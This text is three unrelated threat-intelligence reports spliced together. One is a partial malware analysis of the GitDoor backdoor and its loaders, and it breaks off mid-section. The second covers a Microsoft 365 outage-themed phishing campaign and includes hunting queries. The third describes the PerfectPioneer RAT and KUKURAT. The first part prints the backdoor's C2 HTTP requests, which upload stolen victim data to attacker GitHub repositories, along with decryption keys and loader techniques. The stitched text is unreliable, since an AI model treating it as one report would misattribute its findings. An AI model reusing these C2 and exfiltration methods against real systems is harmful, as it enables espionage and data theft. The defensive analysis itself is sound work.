Introduction

In early 2026, we identified a new, active intrusion campaign that we have named Operation ShadowCloud. The threat actor behind it is abusing the legitimate MeshAgent utility to drop two brand-new backdoors. These implants hide their command‑and‑control (C2) traffic behind cloud services Microsoft SharePoint, GitHub, and Ably, allowing the implants to blend in with normal traffic, effectively evading network-based detections.

We’ve called the implants GraphDoor and GitDoor, reflecting the cloud platform they use for C2. While their C2 protocols differ, the two backdoors share key capabilities:

On‑demand plug-in download: fetching additional modules as needed

In‑memory shellcode injection: loading malicious code directly into memory to extend functionality without touching the disk

The threat actor specifically deploys a modified Erfrp client and Ably messaging service-based plug-ins to proxy traffic between infected systems and C2 servers.

In addition to the plug-ins, we uncovered several shellcode families, most of them delivered as COFF (Common Object File Format) binaries. Our analysis reveals a sophisticated, modular toolset actively maintained and updated with multiple observed backdoor versions in the wild. We found victims in Asia and Africa, primarily within the government sector.

In a recent brief, Sophos touched on a fragment of this campaign. In this two‑part blog, we dive deeper, detailing the backdoors’ C2 communication methods, the assortment of shellcode families and plug-ins that the threat actor delivers to the compromised machines, and the infrastructure we observed supporting the operation. We also highlight the attribution clues:

This article (Part 1 of the story) deals with the initial infection vector, the GitDoor backdoor, and various shellcode families the threat actor drops onto target machines.

Part 2 provides details on the GraphDoor backdoor and the plug-in suite (Keylogging, Process Listing, Screen Capturing, Modified Erfrp Proxy, and Ably Channel Proxy) and examines the evidence that points to links with Chinese‑speaking threat groups.

Initial infection

During our investigation, we uncovered two separate instances of the MeshCentral Agent (MD5: 74b025084026d8d9a64661bf995d835b), which were launched inside a Taiwanese organization. MeshCentral is a web‑based tool that provides remote‑desktop control, command‑line access, and file‑management capabilities.

The exact entry point that let the attackers install the agent is unknown, but evidence points to the reuse of a prior infection already present on the network.

The MeshCentral Agent was hard‑coded to reach a remote server at wss://27.102.66[.]162:443/agent.ashx. Once the C2 session was established, the adversary used the agent to drop three additional items on the endpoint:

A legitimate binary used for DLL sideloading

A malicious loader DLL responsible for unpacking and executing further code

An encrypted file containing the core payload

1st Instance C:\windows\system32\start.exe: legitimate Sandboxie Start binary C:\windows\system32\sbiedll.dll: malicious loader C:\windows\system32\config.ini: encrypted backdoor file 2nd Instance C:\Windows\system32\dts\pc\apo4x\dtsapo4service.exe: legitimate Python application binary C:\Windows\System32\dts\pc\apo4x\python39.dll: malicious loader C:\Windows\system32\dts\pc\apo4x\config.ini: encrypted backdoor file

The threat actor used trusted executables to side-load malicious loader DLLs. We identified the following loaders used in these attacks: jli.dll, SbieDll.dll, python39.dll, WINMM.dll, and libcef.dll, which were dropped onto the host and then implicitly loaded by the respective legitimate binaries: the OpenJDK platform binary (javaw.exe, MD5: 8b78ef5609d942036e93721d75bd1f29), Sandboxie Start (start.exe, MD5: be739a7036dc8e2ee8608fba13c8c3a4), a Python application (pythonw.exe, MD5: 84802caf2579cfe7a38f079a64a3cd22), and the Sysinternals Screen Magnifier tool (zoomit.exe, MD5: d955d03104f988582cbd2967177693d3), which the attackers started as a Windows service.

Loaders

We discovered two distinct loaders, each using a different method to decode the encrypted backdoor payload. In both cases, the loader first decrypts the payload and then injects the resulting code into the current process’s memory. Loader (Type 1) employs a hybrid scheme: first running the data through an RC4 stream cipher and then applying an XOR mask, while Loader (Type 2) simplifies the process by using a straight XOR operation alone.

Type 1 Loader (MD5 32151547d912488ac5242731057170a3)

The loader jli.dll reads the file config.ini (MD5: 3896d44bc6d517291c60ee3f70543a31) located next to it using the native NtCreateFile/NtReadFile calls, then it transforms the obtained data through the following steps to generate the final backdoor:

Base64‑decodes the data with a custom character set (ABCDEFGHIJ01234ZYXWVUTSRQPONMLKzyxwvutsrqponmlkjihgfedcba98765/+)

Decrypts the first layer of encryption with a 16-byte RC4 key that varies across samples

Decrypts the second layer of encryption with a 16‑byte XOR key, which is also sample‑specific

Transforms the decrypted backdoor bytes by abusing the RtlEthernetAddressToStringA and RtlEthernetStringToAddressA APIs to evade defenses. First, RtlEthernetAddressToStringA is used to convert the decrypted backdoor bytes into an Ethernet MAC‑address string.

Convert bytes to MAC address string

Then RtlEthernetStringToAddressA is used to translate a human‑readable MAC address string into a six‑byte binary format, and the resulting bytes are written to memory newly allocated via an AllocADsMem API call.

Convert MAC address string to bytes

Finally, the loader changes the memory protection to PAGE_EXECUTE_READWRITE using VirtualProtect and jumps to the MZ header, which acts as a trampoline into bootstrap code. Since the decrypted backdoor executable is already in memory‑mapped format, the bootstrap code simply performs relocation, resolves imports, and, depending on whether the payload is an executable or a DLL, invokes its entry point. The bootstrap code dynamically resolves API addresses and uses CRC32 to compute a hash of each API name. Both the import library name and the associated API name are XOR‑decrypted with a hardcoded 7‑byte key \x11\xAF\xCE\xDC\xA6\x12\x05 before resolution.

Execution from MZ bytes

Another similar loader jli.dll (MD5: e9d4081fac4a5111e6856f333d490439) has a different approach to API resolution. It reads an encrypted blob from config.ini (MD5: b930fb3ab14fe45b378d5acfa6e0a763), which decrypts to bootstrap code together with a backdoor executable (GraphDoor MD5: 14ec33ea808e697870d00c5e434c2952), which can be either an EXE or a DLL. The bootstrap code resolves the required APIs using an FNV‑1 hash. In the API hashing function, the FNV_offset_basis value changes, but the FNV_prime constant always remains 0x1000193. Once the necessary functions are resolved, the bootstrap code creates a file-mapping object called Local\sm%lu (where %lu is the current PID). Next, it reflectively loads the backdoor into its own process space and jumps to the backdoor’s entry point. If the payload is a DLL and exports functions, each export name is hashed with FNV‑1 and compared against the hard‑coded value 0x974C9EB; a match triggers that export. For cleanup, the bootstrap invokes the DLL’s DllMain with DLL_PROCESS_DETACH, unloads any loaded libraries via FreeLibrary, and releases the allocated memory with VirtualFree.

Type 2 Loader (MD5 e63ec733393e4e7e3424cbff918003a3)

This loader is internally named SbieDll_st.dll. Before attempting to prepare and execute the backdoors, it performs a few checks on the infected machine. It first searches for the byte pattern \x48\x83\xC4\x68\xC3, which disassembles into the instructions shown below, inside KERNEL32.DLL and KernelBase.dll.

Pattern disassembly

If the pattern is found, the code first installs a vectored exception handler and clears the hardware breakpoint by zeroing the CONTEXT.DR7 register. It then verifies that the current process’s name matches a hard‑coded value. After passing these checks, it reads an encrypted blob from config.ini (MD5: 6a54f8008ee659b6923abf5dba2b2cc1) located in the module’s directory. Then it transforms the obtained data through the following steps:

Base64‑decoding the data

XOR‑decrypting it with a hardcoded 16‑byte key that changes per sample

The resulting data is a backdoor executable (GitDoor MD5: 552f0a9cc5fc3755721fa49be05e8035). The loader allocates memory in the current process, copies the decrypted backdoor code into that region, and starts a new thread at the MZ header, which acts as a trampoline into a bootstrap routine identical to that of the Type 1 loader. Before allocating memory and executing the backdoor code, the loader checks the OS version; on Windows 8 (6.2) or newer, it uses the native APIs NtAllocateVirtualMemory, RtlMoveMemory, and NtCreateThreadEx for memory allocation and code execution, while on older systems it falls back to the standard APIs VirtualAlloc, RtlMoveMemory, and CreateThread.

Backdoors

Both GitDoor and GraphDoor incorporate several encryption and obfuscation techniques, including Control Flow Flattening, which obscures their genuine execution flow. They also make heavy use of indirect calls: most routines are encapsulated in several layers of helper functions that invoke one another in sequence, creating extra levels of indirection. The core payload lives deep inside these nested wrappers, which forces analysts to follow each wrapper to understand the real backdoor behavior, greatly hindering static analysis.

Execution is split across multiple threaded components. Every thread is an instance of a Client class in the ably namespace. Both the class and namespace identifiers stem from mangled C++ thread function names, and the accompanying lambda names expose the precise malicious capabilities each thread implements.

GitDoor (MD5 552f0a9cc5fc3755721fa49be05e8035)

The backdoor first decrypts every element required to contact the GitHub C2 – its repository URL, the personal access token, the User‑Agent string, and the necessary HTTP headers. The backdoor utilizes two distinct repositories: one serves as a drop point for receiving command payloads, and the other is used to upload the results of those commands.

/repos/LatonyCharnleyaW/Havo: download the command data and plug-ins

/repos/LatonyCharnleyaW/Trix: upload the victim’s information and the command result

The User-Agent string is:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

The backdoor decrypts the hard‑coded configuration details, appends them to the victim’s collected system information, and then uploads the combined data to the GitHub repository as well as the Ably cloud – the detailed preparation and upload process is described below.

The backdoor builds a random eight‑character identifier that uniquely tags the compromised host and creates a fresh GUID to mark the active communication session. Every HTTP call includes a newly generated random string inserted into the X‑CSRF‑TOKEN header. The malware then issues a POST request to GitHub, using the GitHub API to open a new issue in the Trix repository belonging to the LatonyCharnleyaW user/organization. This request creates a new GitHub issue with the Title and Body values shown below. The malware extracts the number field from the JSON response, which represents the issue number and will be used in subsequent requests.

Title: “problem [GUID]”.

Body: “code [victim unique code]”

The backdoor also connects to Ably at rest.ably.io using a hardcoded authorization token. This token is Base64‑encoded, and after decoding, it reveals the Ably API key, which contains the following information:

App ID: identifies your specific Ably application

Key ID: identifies the specific key within that app

Key Secret: the private secret used for signing requests

The backdoor then builds a unique filename in the format main.%victim_unique_code%.js.map, where %victim_unique_code% corresponds to the value reported when the GitHub issue is created. This file holds the harvested victim system information in both the Ably cloud and the GitHub repository. Prior to the upload, the victim system information is encrypted with AES‑256‑ECB using a randomly generated key. The ciphertext is Base64‑encoded and wrapped in a JSON object (see the example below).

{"key" : "<%randomly generated AES key%>", "sec" : "<%AES-encrypted and base64-encoded victim system information%>"}

After that, the entire JSON payload is XOR‑encrypted with the previously built unique filename, Base64‑encoded once more, and finally sent via a POST request to the Ably service and via a PUT request to the GitHub repository.

Below is the POST request that sends the encrypted victim data to the Ably cloud.

After the data is sent to the Ably cloud, the malware queries /channels/comm/messages?limit=50, exposing the channel name comm. This request serves as a status check, pulling any error or success responses. If the response indicates a failure, the malware retries by posting the same payload to /channels/data/messages.

To upload the collected victim system information to the GitHub repository, the backdoor first issues a GET request to /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map to see whether the file main.%victim_unique_code%.js.map already exists. If the request returns “not found”, the malware follows up with a PUT request (see the example below) that creates the file in the repository to store the victim’s information.

PUT /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map Host: api.github.com Authorization: token %github_pat_token% Accept: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string% Content-Type: application/json {"content":"%encrypted collected victim system info%","message":"commit from INSOMNIA"}

Once the victim’s system information is successfully uploaded, or if the file already exists, the malware downloads two plug-ins that perform screen‑capture (scr.ts) and process enumeration (pr.ts).

To download each plug-in, the backdoor first decrypts the plug-in’s filename as well as the corresponding GitHub repository path, then issues a GET request to fetch the encrypted content of the plug-in.

Below are the HTTP requests to download the scr.ts and pr.ts plug-ins.

The plug-in utilizes a custom, two‑stage decryption routine to unpack its payload:

Stage 1 (AES-256-ECB): the ciphertext is decrypted in 16‑byte blocks using the hard‑coded key: 12345678901234567890123456789012.

Stage 2 (Proprietary Cipher XOR): the output from Stage 1 undergoes a rolling XOR operation using 16‑byte keys. The first block is decrypted using a static initialization key (\x65\x3c\x40\x16\x3d\x38\x20\xa4\x47\x14\x54\xb4\x37\x5a\x3b\x38). For all subsequent blocks, the routine uses a chaining effect where the key is derived from the ciphertext of the immediately preceding block.

Once decrypted, the resulting bytes constitute the plug-in’s shellcode, which the backdoor loads directly into memory.

After loading the plug-ins, the backdoor sends a POST request to apply the bug label to the newly created issue (identified by its issue number). The request is shown below.

If the issue already has the bug label, the backdoor issues a DELETE request to remove that label.

DELETE /repos/LatonyCharnleyaW/Trix/issues/<issue_number>/labels/bug?rd=%random alphanumeric characters% HTTP/1.1 Host: api.github.com Connection: Keep-Alive Content-Type: application/json Accept: application/json Authorization: token %github_pat_token% User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string%

The label‑or‑unlabel issue request is always followed by a GET request that pulls the contents of the Havo repository.

GET /repos/LatonyCharnleyaW/Havo/contents HTTP/1.1 Host: api.github.com Connection: Keep-Alive Content-Type: application/json Accept: application/json Authorization: token %github_pat_token% User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string%

The backdoor continuously sends both requests – labeling/unlabeling the issue as a bug and fetching the repository contents – until it receives an exit command.

The content retrieval request returns a JSON array that lists filenames together with a number of other details, including the path to download the file. Every file in the list contains command data to be processed. The backdoor extracts the name property to get each filename, then searches the names for the unique victim code string. When it finds a match, it fetches that file via /repos/LatonyCharnleyaW/Havo/contents/<filename> and processes the command data as described in the Command processing section.

On November 13, 2026, Microsoft Threat Intelligence observed a coordinated, high-volume phishing campaign targeting organizations across multiple sectors worldwide. The threat actors used phishing emails disguised as legitimate Microsoft 365 service-health notifications to lure recipients into clicking a malicious link. The messages created a false sense of urgency by claiming that emails had been held during a service disruption and would be deleted within 24 hours unless the recipient took action to restore them. This is consistent with historical attacker campaigns which continuously look for notable global events to exploit in their social engineering lures.

Microsoft identified the threat actor’s use of specific sender domain names, randomized outage subjects, recipient-specific tracking links, and a common non-Microsoft destination to make the messages appear relevant while complicating simple pattern matching. We assess that the activity was likely credential phishing; however, the available evidence does not confirm credential capture, malware delivery, or post-compromise activity. Multiple threat actors may continue to look for ways to exploit notable global events in any social engineering pretext.

If credentials were entered, organizations should consider the risk of account compromise, mailbox access, business email compromise, internal phishing, inbox-rule manipulation, and access to cloud collaboration data. Microsoft Defender blocks malicious domains used in this campaign, and Microsoft Defender for Office 365 blocks and quarantines phishing emails. We will continue to monitor this campaign and other related threats. Security teams can use Microsoft Defender for Office 365 and Microsoft Defender XDR capabilities to investigate messages, URLs, clicks, and potential follow-on activity.

Phishing attack overview

Microsoft analyzed the email lures sent on November 13, 2026: the emails used the subject pattern “Outage – <random token>” and display names built from a three-character, organization-style prefix followed by “Outage Notification” or “Service Health.”

Example subject line:

Outage – aF7vG6

Example display names:

MSF Outage Notification

AMZ Service Health

One example email body referenced a purported Exchange Online incident on November 12 and claimed that four messages were held after the outage. The urgency of a 24-hour deletion deadline and the prominent “RESTORE MESSAGES” call to action were intended to drive immediate interaction.

The activity used distinct sender domains, including: moments-notice[.]com, planetmaison[.]com and newbooker[.]com. The messages also used email-delivery and link-tracking infrastructure to generate recipient-specific URLs. In multiple samples, click-tracking links led to reallifeaccounting[.]com or reallifeaccounting[.]com/themelist0.html.

The sample set was link-based: no QR codes or non-EML attachments were observed, and Microsoft did not identify evidence of executable, archive, document, or other malware payload delivery. The off-brand destination and Microsoft 365 impersonation support an assessment of likely credential phishing, but the available evidence did not include the final page source, credential fields, credential-submission telemetry, or post-compromise activity. Microsoft therefore has not attributed the campaign to a named threat actor or malware family.

Figure 1. Sample of one of the Microsoft 365 outage-themed phishing lures.

Attack chain overview

Figure 2. Observed attack chain for the Microsoft 365 outage-themed phishing campaign.

Delivery: A user receives an email from the moments-notice[.]com, planetmaison[.]com or newbooker[.]com sender-domain cluster. The subject contains “Outage -” followed by a randomized string of character tokens. The body of the message includes a fake email conversation positioned to be hidden from the recipient and appears to be an attempt at mail filtering evasion.

Impersonation: The message poses as a Microsoft 365 service-health notification, uses a target-specific display-name prefix, and references Exchange Online, Outlook, Teams, SharePoint, and Copilot.

Social engineering: The lure claims that messages were held during an outage and will be deleted within 24 hours, creating urgency and fear of lost business email.

User interaction: The recipient selects “RESTORE MESSAGES” or “TAKE ACTION”. A recipient-specific tracking URL records or routes the click.

Redirect: The observed link chain leads to reallifeaccounting[.]com, including the path /themelist0.html in some samples.

Assessed threat actor objectives: Microsoft assesses that the activity was likely intended to capture credentials. Credential submission and subsequent account compromise were not directly observed in the supplied evidence.

Mitigation and protection guidance

Immediate actions

Messages in environments protected by Microsoft Defender for Office are currently blocked/quarantined, and we have not observed any indicators of compromise from this attack.

However, organizations can consider taking the following steps:

Search for and remove phishing messages. Search mail telemetry for the observed sender domains, display-name and subject patterns, lure phrases, tracking hosts, and destination domain. Quarantine matching messages and remove delivered copies in accordance with organizational response procedures.

Identify users who clicked campaign links. Identify users who selected campaign links. Review click telemetry, proxy logs, and browser or endpoint evidence to determine whether the destination was reached and whether credentials may have been entered.

Reset credentials and investigate potentially compromised accounts For any user who may have entered credentials, reset the password, revoke active sessions and refresh tokens, and verify multifactor authentication registrations. Review the account for suspicious sign-ins, OAuth consent, new inbox or forwarding rules, delegate permissions, and unusual access to Exchange Online, SharePoint, OneDrive, or Teams.

Block or closely monitor campaign infrastructure. Block or closely scrutinize reallifeaccounting[.]com and the observed /themelist0.html path while the activity is investigated. Avoid broadly blocking shared email-delivery infrastructure based only on this campaign; combine sender, content, URL, and behavioral signals to reduce collateral impact.

Remind users how to verify legitimate service-health communications. Remind users that legitimate Microsoft 365 service-health communications do not direct them to non-Microsoft domains to recover held mail. Validate service issues through the Microsoft 365 admin center rather than through unsolicited email links.

Ongoing hardening

Require multifactor authentication and prioritize phishing-resistant methods, such as passkeys or security keys, where possible.

Review and enable Safe Links and Safe Attachments policies in Microsoft Defender for Office 365.

Enable Zero-hour auto purge (ZAP) to help retroactively neutralize phishing, spam, or malware messages that were delivered before new threat intelligence became available.

Use Attack simulation training and ongoing awareness guidance to help users recognize outage-themed urgency, sender-domain mismatches, and requests to restore or release messages.

Encourage users to report suspicious messages through the organization’s established Outlook reporting workflow so security teams and Microsoft can investigate quickly.

Microsoft Security Copilot

Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat:

Incident investigation: Summarize related alerts and incidents and identify the affected users and devices.

Microsoft User analysis: Review the activity of users who selected the campaign links. This includes sign-ins, MFA-method changes, inbox or forwarding rules, and OAuth grants.

Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.

Microsoft Defender XDR Threat analytics

Advanced hunting queries

These sample queries search for campaign characteristics in Microsoft Defender XDR. Review the results in the context of your environment and adjust the indicators only after validation. The queries do not set a time range; use the advanced hunting time selector for the period you want to investigate.

Find messages by sender domain or subject pattern

This query searches for the observed sender-domain clusters and the randomized outage subject pattern.

let campaignDomains = dynamic([ "moments-notice.com", "em4493.moments-notice.com", "newbooker.com", "em.newbooker.com" ]); EmailEvents | where SenderFromDomain in~ (campaignDomains) or Subject matches regex @"(?i)^(?:\[external\]\s*|\*external\*\s*)?outage\s*-\s*[a-z0-9]{6}$" | project Timestamp, NetworkMessageId, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, DeliveryAction, DeliveryLocation | order by Timestamp desc

Find messages containing campaign URLs

This query identifies message URLs that contain the observed destination, click-tracking hosts, or tracking-pixel pattern, and joins the results to message metadata.

let campaignUrlParts = dynamic([ "reallifeaccounting.com", "u113727626.ct.sendgrid.net/ls/click", "url.newbooker.com/ls/click", "162.120.17.69:8080/t/v3." ]); EmailUrlInfo | where Url has_any (campaignUrlParts) | project NetworkMessageId, Url, UrlDomain, UrlLocation | join kind=inner ( EmailEvents | project Timestamp, NetworkMessageId, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, DeliveryAction, DeliveryLocation ) on NetworkMessageId | project Timestamp, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, Url, UrlDomain, UrlLocation, DeliveryAction, DeliveryLocation, NetworkMessageId | order by Timestamp desc

Investigate user clicks on campaign URLs

This query searches click telemetry for the observed destination and tracking patterns so investigators can identify affected users and determine whether clicks were allowed.

let campaignUrlParts = dynamic([ "reallifeaccounting.com", "u113727626.ct.sendgrid.net/ls/click", "url.newbooker.com/ls/click", "162.120.17.69:8080/t/v3." ]); UrlClickEvents | where Url has_any (campaignUrlParts) | project Timestamp, AccountUpn, Url, ActionType, Workload, NetworkMessageId, IPAddress, IsClickedThrough, UrlChain | order by Timestamp desc

For users who interacted with campaign links, also investigate:

Unusual sign-ins

New devices or user agents

MFA-method changes

OAuth grants

Inbox or forwarding rules

Delegate permissions

Unusual access to mailbox or collaboration data

These behaviors were not observed in the source messages, they are post-click investigation targets for suspected Microsoft 365 credential phishing.

Executive Summary

Unit 42 has uncovered a multi-stage cyberespionage campaign that has been targeting Southeast Asian government entities since at least July 2025. We track this activity as TGR-STA-0049 (also tracked as REF7707, Earth Alux, Ink Dragon). The defining signature of the threat actor behind the activity is the targeting of government entities, combined with the use of advanced custom payloads that are designed for high-stealth intelligence collection operations, with an emphasis on evading security detection tools.

The campaign we investigated demonstrates high operational stealth and novel tool sets.

Activity associated with this group previously included deploying Squidoor (AKA FINALDRAFT) – an advanced backdoor used against high-value global targets since 2023.

Recently, activity associated with this group has included expanded tradecraft. Associated activity that we observed included deploying two previously undocumented custom remote access Trojans (RATs): PerfectPioneer RAT (spotted in July 2025) and its modular successor, KUKURAT (deployed in March 2026).

Over a nine-month period, we observed the attackers behind the activity consistently refining their capabilities to meet evolving operational needs. This campaign’s tradecraft features three particularly advanced capabilities:

Covert HTTP/3 (QUIC) C2 communications: An early adoption of HTTP/3 over UDP, providing a highly efficient command and control channel that may bypass traditional TCP-optimized deep packet inspection.

An operational safety switch: PerfectPioneer RAT features a built-in validation engine that actively blocks remote operators from executing noisy or destructive commands that could trigger environment security alerts.

Multi-vector heuristic camouflage: KUKURAT employs a custom spoofing engine that generates synthetic, benign-looking network, registry and file activity. By manipulating the behavioral baseline of the endpoint, it can successfully obscure indicators of compromise within a vast volume of artificial noise.

We provide a comprehensive technical breakdown of these unique malware families, the group’s evolving techniques, tactics and procedures (TTPs) and the highly targeted data exfiltration observed in this campaign.

Cortex AgentiX Agentic Assistant streamlined our investigation.

Palo Alto Networks customers are better protected from the threats described in this article through the following products and services:

Advanced WildFire

Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense

Cortex XDR and XSIAM

Idira Endpoint Privilege Manager (EPM)

Idira Privileged Access Management (PAM)

Idira Secure Infrastructure Access (SIA)

Organizations can access tailored adversary intelligence, direct analyst consultations, and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service.

If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.

Related Unit 42 Topics

Remote Access Trojan (RAT), Cyberespionage, Command and Control (C2)

Background on TGR-STA-0049

TGR-STA-0049 has been active since at least March 2023. It primarily targets high-value sectors, including government organizations across Southeast Asia, South America and Europe. The targeting of strategic entities for data collection and exfiltration, combined with advanced stealth practices and long-term persistence, are characteristic of cyberespionage operations.

In previous campaigns, this group deployed Squidoor, a backdoor targeting Windows and Linux systems. As the group expanded its operations, it continued to integrate new tools and malware variants into its tool set. In their most recent campaign, dating back to mid-2025, the attackers introduced two previously undocumented, advanced malware families designed for stealth, data collection and exfiltration: PerfectPioneer RAT and KUKURAT. As this campaign progressed into early 2026, the threat actor began transitioning their infrastructure from PerfectPioneer to the new KUKURAT, which has been observed in the wild since March 2026.

We uncovered six distinct variants of PerfectPioneer RAT that the group tracks as:

newhttp3

PerfectRat

Pioneer

RatAAkk-tt

rat_http3_ls

rat_http3_cc

All six variants have evolved iteratively since at least July 2025, exhibiting rapid, adaptive development cycles. Our analysis focuses on newhttp3 as a representative example.

Operational Overview and Infrastructure

We examine the TTPs observed in this recent TGR-STA-0049 campaign, and map the full operational lifecycle, including:

Initial infection vectors

Adopting HTTP/3 as a communication protocol

Credential harvesting and data exfiltration methodologies

We also provide a deep dive into the underlying architecture and specialized capabilities of the PerfectPioneer RAT and KUKURAT malware families, focusing on:

A structural comparison of different PerfectPioneer RAT variants across the development lifecycle.

PerfectPioneer RAT’s unique isDangerousCommand fool-proofing mechanism that prevents the malware operator from executing forensics-heavy or destructive commands.

KUKURAT's extensive modular framework.

KUKURAT’s integration of automated heuristic camouflage engines.

Infection Vectors

The attackers behind this activity leverage a dual-track infection strategy to establish and maintain a foothold inside targeted organizations through a combination of server exploitation and phishing.

Server exploitation is the primary infection vector observed in this campaign — such as the exploitation of vulnerable, unpatched Microsoft Exchange servers and web servers to deploy web shells. We observed a mix of custom and publicly available web shells, including variations of ASPXSpy, Godzilla, Bysunue.aspx and Suo5. This tooling is consistent with the actor's past campaigns.

Figure 1 shows the execution of the PerfectPioneer RAT from a web shell, and how attackers use it to execute initial reconnaissance commands on the infected server.

Our investigation revealed that the threat actor employed phishing tactics as a secondary infection vector, leveraging decoy PDFs and lookalike domains to manipulate users into compromising their hosts. The use of tailored infrastructure and industry-specific decoys demonstrates a highly targeted strategy designed to maximize deception within high-priority sectors.

HTTP/3 Adoption

Both PerfectPioneer RAT and KUKURAT use HTTP/3 as the primary method for communicating with C2 infrastructure. While the adoption of HTTP/3 is rare across the broader malware landscape, its deployment in this campaign reflects an emerging trend among advanced threat actors. The deployment of HTTP/3 provides:

A secure and fast communication channel: HTTP/3 uses the QUIC transport protocol running over UDP.

An effective defense evasion mechanism: Because HTTP/3 uses UDP, enterprise network defenses cannot perform passive TLS interception without breaking the underlying connection. Some corporate firewalls and traditional IDS/IPS engines are not updated to inspect UDP traffic with the same level of scrutiny as standard TCP traffic. When legacy security policies are not optimized exclusively for TCP-based web channels, outbound UDP port 443 communications frequently bypass deep packet inspection entirely – potentially allowing malicious QUIC traffic to flow unhindered.

PerfectPioneer RAT: Deep Dive

Since at least July 2025, the group associated with this activity has deployed PerfectPioneer RAT, a custom Go-based malware family. We examine the RAT's execution methods on infected hosts and explore the architecture and behavior of a representative variant. Our structural comparison of six distinct iterations illustrates the adversary's active development pipeline.

Loaders and Execution

In addition to being dropped to disk as an executable, we observed the execution of PerfectPioneer RAT via three methods across compromised networks: DLL side-loading, decoy installers and phishing. This tactical versatility underscores the threat actor’s operational agility, optimizing target deception and defense evasion across varied environments.

DLL side-loading: The attackers dropped a legitimate, benign executable that they had structurally modified to contain XOR-encrypted shellcode embedded with the PerfectPioneer RAT payload. A malicious loader DLL accompanies this altered binary. Upon execution, the modified legitimate application loads the side-loaded DLL, which reads, decrypts and executes the shellcode from the tampered host executable. The shellcode then deploys the payload in memory.

Decoy installers: The actor used decoy software installers to drop to disk and execute the PerfectPioneer RAT background agent, while running a seemingly normal application setup wizard. In one case, we found that a decoy software installer wrote to disk and executed a GlobalProtect installer. This legitimate Palo Alto Networks secure remote access product was used as a cover, while an executable of PerfectPioneer RAT was written to disk and executed in the background.

Phishing: Unsuspecting targets downloaded several malware samples from domains masquerading as official government websites. To evade detection and deceive victims, these executable files are disguised as PDF files, displaying a PDF icon. When the victim attempts to open the PDF file, they actually click on the malware which launches a decoy PDF document to maintain the illusion of legitimacy while the malware runs in the background.

Figure 2 shows one of the decoy PDF documents used by the threat actor, impersonating a 2025 official document from the Union Election Commission of the Republic of the Union of Myanmar.

The newhttp3 Variant

Our deep dive focuses primarily on a variant that the author labeled newhttp3, as revealed in one of the recovered project paths: D:/proj/http3/newhttp3/agent/. We selected this sample for deeper technical evaluation because it represents the most feature-complete variant.

Commands and Capabilities

The newhttp3 variant contains an expansive array of commands that potentially grant the remote operator total control over the compromised endpoint. These capabilities are natively compiled into the Go binary, unlike the dynamic modules architecture later introduced in KUKURAT.

newhttp3 includes a diverse suite of capabilities for comprehensive data harvesting, host control and resource management, which can be structurally grouped into the following functional categories:

File operations

List, upload, download, delete: Full file system access

Chunked transfers: Large files are transferred in chunks with progress tracking

Temporary files management: Open file handles are tracked and periodically cleaned up

Shell execution

Command execution capabilities

Process management

List/kill/start processes

COM-based process creation: Alternative execution path via COM objects

Code injection using the classic VirtualAllocEx, WriteProcessMemory and CreateRemoteThread techniques

Keylogging

SOCKS5 proxy

Screenshot capture

Window enumeration and manipulation

Resource monitoring

We provide the full list of commands in Appendix A: Analysis of Additional PerfectPioneer RAT Features.

Architecture and Communication

The newhttp3 variant’s communication framework appears to be designed with a focus on both network evasion and operational stability. Rather than relying on a single communication channel, the malware blends stealthy network protocols with automated routines aimed at maintaining steady connectivity and managing host resource overhead.

PerfectPioneer RAT relies on HTTP/3 as its primary C2 communication mechanism, automatically falling back to HTTP/2 in the event of connection failure.

The agent interacts with the C2 infrastructure via four principal endpoints, as detailed in Table 1. The URL endpoints used by PerfectPioneer RAT overlap with those used later by KUKURAT, representing another key artifact connecting the two families to a common development pipeline.

Self-Healing Connection Architecture

PerfectPioneer RAT implements three highly specific automated routines. These are designed to maintain stable connections and manage system overhead, to minimize its forensic footprint and maintain a low profile.

Reconnection routine: This routine ensures the connection to the C2 remains active by tracking an internal variable named connected. If the connected variable is toggled to false by either the heartbeat or command polling routines due to a network disruption, the reconnection routine immediately steps in. It cancels the active heartbeat and command polling loops, then forces a clean re-registration workflow with the C2 server in an attempt to forcefully reset the connection state.

Cleanup routine: Designed to limit the malware's forensic footprint on disk and prevent excessive consumption of host memory, this routine achieves its goals via two automated methods:

Cleanup temporary files: Continuously tracks and deletes all temporary files created during operation. This minimizes the creation of persistent artifacts on disk and shortens the window of opportunity for endpoint detection tools or forensic analysts to recover cached operational data from the file system.

Cleanup memory usage: Monitors the active memory footprint of the RAT. If memory usage exceeds 100 MB, it explicitly forces Go’s runtime garbage collection cycle to aggressively purge unallocated memory. Keeping the process memory footprint low reduces the likelihood of triggering suspicion due to high CPU usage.

Resource monitoring routine: This routine tracks client-side CPU and memory utilization on behalf of the operator. It captures a performance snapshot every 30 seconds, which the remote operator can later retrieve via a specific command to monitor host machine overhead.

Comparison of PerfectPioneer RAT Variants

We identified six distinct variants of PerfectPioneer RAT. Comparing these provides a unique window into the group’s active development cycle and illustrates how they adapt their code to meet specific operational constraints.

While the underlying codebase is very similar across variants, we observed differences in communication protocols and functional features. The compilation timestamps across all analyzed samples were either systematically modified or completely omitted, which prevents the reconstruction of a definitive chronological development timeline.

